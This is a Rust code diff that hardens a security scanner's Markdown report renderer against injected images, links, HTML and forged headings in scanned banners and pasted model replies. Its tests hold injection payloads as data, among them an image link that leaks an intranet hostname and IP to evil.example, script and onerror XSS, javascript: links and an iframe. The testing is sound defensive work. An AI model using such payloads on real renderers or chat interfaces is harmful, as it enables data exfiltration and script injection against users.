@@ -15,7 +15,7 @@ use anyhow::{Context, Result};
 use crate::checklist;
 use crate::cve;
 use crate::db::Db;
-use crate::evidence::{Source, VerificationStatus};
+use crate::evidence::{inert_markdown, Source, VerificationStatus};
 use crate::graph::{Advisory, Fact, Graph, Host};
 use crate::mode::Mode;
 use crate::queue::{self, TaskRow};
@@ -42,14 +42,28 @@ pub struct Inputs {
     pub chats: Vec<(String, String)>,
 }
 
-/// Escapes scanned text for use in Markdown prose and table cells, so a
-/// banner cannot inject HTML or break a table.
+/// Escapes scanned text for use in Markdown prose and table cells: it is
+/// shown as the characters it is. A banner cannot inject HTML, break a
+/// table, or become an image (fetched by whoever opens the report), a link,
+/// emphasis or a heading.
 fn md(text: &str) -> String {
-    text.replace('&', "&amp;")
-        .replace('<', "&lt;")
-        .replace('>', "&gt;")
-        .replace('|', "\\|")
-        .replace(['\n', '\r'], " ")
+    let mut out = String::with_capacity(text.len() + 8);
+    for ch in text.chars() {
+        match ch {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '\n' | '\r' => out.push(' '),
+            // The backslash first of all: `\|` must not become `\\|`, an
+            // escaped backslash followed by a real cell border.
+            '\\' | '|' | '`' | '*' | '_' | '[' | ']' | '!' | '~' | '#' | '$' => {
+                out.push('\\');
+                out.push(ch);
+            }
+            other => out.push(other),
+        }
+    }
+    out
 }
 
 /// Scanned text as an inline code span.
@@ -57,133 +71,45 @@ fn code(text: &str) -> String {
     format!("`{}`", text.replace('`', "'").replace(['\n', '\r'], " "))
 }
 
-fn clean_chat_line(line: &str) -> String {
-    line.chars()
-        .filter_map(|ch| match ch {
-            '\t' => Some(' '),
-            c if c.is_control() => None,
-            '\u{200b}'..='\u{200f}'
-            | '\u{202a}'..='\u{202e}'
-            | '\u{2066}'..='\u{2069}'
-            | '\u{feff}' => None,
-            c => Some(c),
-        })
-        .collect()
+/// [`code`] for a table cell, where a bare `|` ends the cell, code span or
+/// not: there it is written `\|`.
+fn code_cell(text: &str) -> String {
+    code(&text.replace('\\', "/").replace('|', "\\|"))
 }
 
-fn find_closing_ticks(bytes: &[u8], from: usize, count: usize) -> Option<usize> {
-    let mut i = from;
-    while i < bytes.len() {
-        if bytes[i] == b'`' {
-            let start = i;
-            while i < bytes.len() && bytes[i] == b'`' {
-                i += 1;
-            }
-            if i - start == count {
-                return Some(start);
-            }
-        } else {
-            i += 1;
-        }
-    }
-    None
-}
-
-fn escape_html_outside_inline_code(line: &str) -> String {
-    let mut out = String::with_capacity(line.len());
-    let bytes = line.as_bytes();
-    let mut i = 0;
-    let leading_spaces = bytes.iter().take(3).take_while(|&&b| b == b' ').count();
-    if bytes.get(leading_spaces) == Some(&b'>')
-        && matches!(bytes.get(leading_spaces + 1), None | Some(b' '))
-    {
-        out.push_str(&line[..=leading_spaces]);
-        i = leading_spaces + 1;
-    }
-    while i < line.len() {
-        if bytes[i] == b'`' {
-            let start = i;
-            while i < bytes.len() && bytes[i] == b'`' {
-                i += 1;
-            }
-            let tick_len = i - start;
-            if let Some(close_at) = find_closing_ticks(bytes, i, tick_len) {
-                let end = close_at + tick_len;
-                out.push_str(&line[start..end]);
-                i = end;
-            } else {
-                out.push_str(&line[start..i]);
-            }
-            continue;
-        }
-        let ch = line[i..].chars().next().expect("i < line.len()");
-        match ch {
-            '<' => out.push_str("&lt;"),
-            '>' => out.push_str("&gt;"),
-            other => out.push(other),
-        }
-        i += ch.len_utf8();
-    }
-    out
-}
-
-fn fence_opening(line: &str) -> Option<(u8, usize)> {
-    let indent = line.bytes().take(4).take_while(|&b| b == b' ').count();
-    if indent > 3 {
-        return None;
-    }
-    let rest = &line.as_bytes()[indent..];
-    let marker = *rest.first()?;
-    if marker != b'`' && marker != b'~' {
-        return None;
-    }
-    let len = rest.iter().take_while(|&&b| b == marker).count();
-    if len < 3 {
-        return None;
-    }
-    if marker == b'`' && rest[len..].contains(&b'`') {
-        return None;
-    }
-    Some((marker, len))
-}
-
-fn is_fence_closing(line: &str, marker: u8, min_len: usize) -> bool {
-    let indent = line.bytes().take(4).take_while(|&b| b == b' ').count();
-    if indent > 3 {
-        return false;
-    }
-    let rest = &line.as_bytes()[indent..];
-    let len = rest.iter().take_while(|&&b| b == marker).count();
-    len >= min_len && rest[len..].iter().all(|&b| b == b' ')
-}
-
+/// Writes a chat file into the report: its own headings one level down, and
+/// nothing in it live (see [`inert_markdown`]). A code block the text left
+/// open is closed, so that it cannot take the rest of the report with it.
 fn render_chat_markdown(out: &mut String, text: &str) {
-    let mut in_fence: Option<(u8, usize)> = None;
-    for raw_line in text.lines() {
-        let line = clean_chat_line(raw_line);
-        if let Some((marker, min_len)) = in_fence {
-            if is_fence_closing(&line, marker, min_len) {
-                in_fence = None;
+    let mut open_fence: Option<(u8, usize)> = None;
+    for line in inert_markdown(text).lines() {
+        let indent = line.bytes().take(4).take_while(|&b| b == b' ').count();
+        let rest = &line.as_bytes()[indent.min(line.len())..];
+        let marker = rest.first().copied().unwrap_or(0);
+        let run = rest.iter().take_while(|&&b| b == marker).count();
+        let fence = indent <= 3 && (marker == b'`' || marker == b'~') && run >= 3;
+        match open_fence {
+            Some((open, length)) => {
+                if fence && marker == open && run >= length {
+                    open_fence = None;
+                }
             }
-            out.push_str(&line);
-            out.push('\n');
-            continue;
+            None if fence => open_fence = Some((marker, run)),
+            None => {}
         }
-        if let Some(fence) = fence_opening(&line) {
-            in_fence = Some(fence);
-            out.push_str(&line);
-            out.push('\n');
-            continue;
-        }
-        // Nest the file's own headings below this section.
-        if line.starts_with('#') {
+        // Nest the file's own headings below this section, also one that
+        // is moved in by up to three spaces.
+        if open_fence.is_none() && indent <= 3 && marker == b'#' {
+            out.push_str(&line[..indent]);
             out.push_str("###");
+            out.push_str(&line[indent..]);
+        } else {
+            out.push_str(line);
         }
-        out.push_str(&escape_html_outside_inline_code(&line));
         out.push('\n');
     }
-    if let Some((marker, len)) = in_fence {
-        out.extend(std::iter::repeat_n(marker as char, len));
+    if let Some((marker, length)) = open_fence {
+        out.extend(std::iter::repeat_n(marker as char, length));
         out.push('\n');
     }
 }
@@ -404,7 +330,9 @@ pub fn render(inputs: &Inputs) -> String {
     }
     for (host, advisory) in &confirmed {
         let _ = writeln!(out, "### {} on {}\n", md(&advisory.id), md(&host.label()));
-        let _ = writeln!(out, "{}\n", md(&advisory.title));
+        // Fixed words first: a title cannot start the line as a list
+        // item, a quote or a heading of its own.
+        let _ = writeln!(out, "Summary: {}\n", md(&advisory.title));
         let _ = writeln!(out, "- Severity: {}", md(&severity(advisory)));
         if advisory.kev {
             out.push_str("- Listed in the CISA Known Exploited Vulnerabilities catalog\n");
@@ -516,8 +444,8 @@ pub fn render(inputs: &Inputs) -> String {
             let _ = writeln!(
                 out,
                 "| {} | {} | {} |",
-                code(&secret.token),
-                code(&secret.preview),
+                code_cell(&secret.token),
+                code_cell(&secret.preview),
                 md(&secret.first_seen_utc)
             );
         }
@@ -918,12 +846,135 @@ mod tests {
         ];
         let rendered = render(&custom);
         assert!(rendered.contains("| 443/tcp \\| &lt;img src=x&gt; |"));
-        assert!(rendered.contains("#### Heading &lt;script&gt;alert(1)&lt;/script&gt;"));
-        assert!(rendered.contains("> Quote with &lt;b&gt;html&lt;/b&gt; and `<raw>` span"));
+        // No tag opens anywhere, in or out of code: what counts as code
+        // differs between Markdown dialects.
+        assert!(rendered.contains("#### Heading &lt;script>alert(1)&lt;/script>"));
+        assert!(rendered.contains("> Quote with &lt;b>html&lt;/b> and `&lt;raw>` span"));
         assert!(rendered.contains("```sh\n# shell comment stays a comment\n"));
-        assert!(rendered.contains("grep '<title>'"));
-        assert!(rendered.contains("<div>unclosed fence\n```\n\n### From chats/192.0.2.2.md"));
+        assert!(rendered.contains("grep '&lt;title>'"));
+        assert!(rendered.contains("&lt;div>unclosed fence\n```\n\n### From chats/192.0.2.2.md"));
         assert!(rendered.contains("##### Next chat"));
+        for tag in ["<script", "<img", "<b>", "<div", "<raw"] {
+            assert!(!rendered.contains(tag), "{tag}");
+        }
+    }
+
+    #[test]
+    fn scanned_text_is_shown_as_text_never_as_markdown() {
+        let mut custom = inputs();
+        {
+            let host = custom.graph.hosts.get_mut("10.10.10.5").unwrap();
+            let port = host.ports.get_mut("443/tcp").unwrap();
+            port.http.as_mut().unwrap().server = Some(
+                "nginx ![s](https://e.example/x.png) [a](javascript:1) \\| **b** _c_ `d`".into(),
+            );
+            port.version = Some("1.18.0 [vendor fix](https://e.example/fix.sh)".into());
+            port.tls_sans.insert("![c](https://e.example/b.png)".into());
+            // A confirmed finding whose title starts like a list item and
+            // opens a code block.
+            host.advisories[0].title = "- Status: fixed ``` swallow the rest".into();
+            host.advisories[0].record.verification_status = VerificationStatus::Confirmed;
+        }
+        custom.secrets = vec![crate::vault::ExposedSecret {
+            token: "<<SEC_01>>".into(),
+            preview: "a|b... (9 chars)".into(),
+            first_seen_utc: "2026-11-12T09:00:00Z".into(),
+        }];
+        let rendered = render(&custom);
+        for live in [
+            "![s](",
+            "![c](",
+            "[a](javascript:",
+            "[vendor fix](https://",
+            "**b**",
+            " _c_ ",
+        ] {
+            assert!(!rendered.contains(live), "{live} is live in:\n{rendered}");
+        }
+        assert!(
+            rendered.contains("!\\[s\\](https://e.example/x.png)"),
+            "{rendered}"
+        );
+        assert!(rendered.contains("\\*\\*b\\*\\*"));
+        // The port row keeps its cells: the `\|` of the header did not end one.
+        let row = rendered
+            .lines()
+            .find(|line| line.starts_with("| 443/tcp |"))
+            .unwrap();
+        let cells = row
+            .replace("\\\\", "")
+            .replace("\\|", "")
+            .matches('|')
+            .count();
+        let header = rendered
+            .lines()
+            .find(|line| line.starts_with("| Port |"))
+            .unwrap();
+        assert_eq!(cells, header.matches('|').count(), "{row}");
+        // The title neither opens a code block nor starts a list item, and
+        // what follows the finding is still there, outside any block.
+        assert!(
+            rendered.contains("Summary: - Status: fixed \\`\\`\\` swallow the rest"),
+            "{rendered}"
+        );
+        assert!(rendered.contains("\n## Hosts\n"));
+        assert!(
+            rendered.contains("| `<<SEC_01>>` | `a\\|b... (9 chars)` |"),
+            "{rendered}"
+        );
+    }
+
+    #[test]
+    fn a_model_reply_is_written_inert_into_the_report() {
+        let mut custom = inputs();
+        custom.chats = vec![(
+            "192.0.2.10.md".into(),
+            // What the 2026-11 audit used against the earlier filter.
+            "![s](https://evil.example/c.png?h=intranet.corp.example&ip=10.1.2.3)\n\
+             \\` <img src=x onerror=alert(1)> \\`\n\
+             a line ending in a lone `\n\
+             ` <script>alert(2)</script> `\n\
+             [ref]: javascript:alert(3)\n\
+             see [the fix][ref] and <https://evil.example/auto>\n\
+             Confirmed findings\n\
+             ===\n\
+             \u{20}# Forged section\n\
+             ```{=html}\n\
+             <iframe src=//evil.example></iframe>\n\
+             ```\n\
+             Sources\n\
+             ---\n\
+             \n\
+             ---\n"
+                .into(),
+        )];
+        let rendered = render(&custom);
+        let chat = &rendered[rendered.find("### From chats/192.0.2.10.md").unwrap()..];
+        for live in [
+            "![s](",
+            "<img",
+            "<script",
+            "<iframe",
+            "<https://",
+            "\n[ref]:",
+            "\n===",
+            "\n # Forged",
+            "\n## Forged",
+            "\nSources\n---",
+        ] {
+            assert!(!chat.contains(live), "{live:?} is live in:\n{chat}");
+        }
+        assert!(chat.contains("!\\[s]\\(https://evil.example/c.png"));
+        assert!(chat.contains("[ref]\\: javascript:alert(3)"));
+        assert!(chat.contains("\n\\===\n"));
+        // One level down like every other heading of the file, not a new
+        // top-level section of the report.
+        assert!(chat.contains("\n #### Forged section"), "{chat}");
+        // A rule after an empty line is still a rule.
+        assert!(chat.contains("\n\n---\n"));
+        // Writing it twice changes nothing.
+        let once = inert_markdown(&custom.chats[0].1);
+        assert_eq!(inert_markdown(&once), once);
     }
 
     #[test]
